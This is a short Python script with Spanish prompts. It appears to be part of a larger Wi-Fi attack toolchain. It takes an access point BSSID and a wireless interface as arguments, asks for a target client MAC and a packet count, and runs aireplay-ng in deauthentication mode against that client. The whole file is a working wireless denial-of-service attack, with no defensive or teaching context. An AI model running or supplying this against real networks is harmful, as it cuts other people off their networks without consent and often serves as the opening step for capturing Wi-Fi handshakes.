import subprocess

import sys

if __name__ == "__main__":
    # Obtener los argumentos pasados desde script1.py
    bssid = sys.argv[1]
    interfaz = sys.argv[2]
    

macobjetivo = input("Ingrese la mac del Objetivo: ")
peticiones = input("Cantidad de Peticiones: ")



subprocess.run(["aireplay-ng", "-0", peticiones, "-a", bssid, "-c", macobjetivo, interfaz])


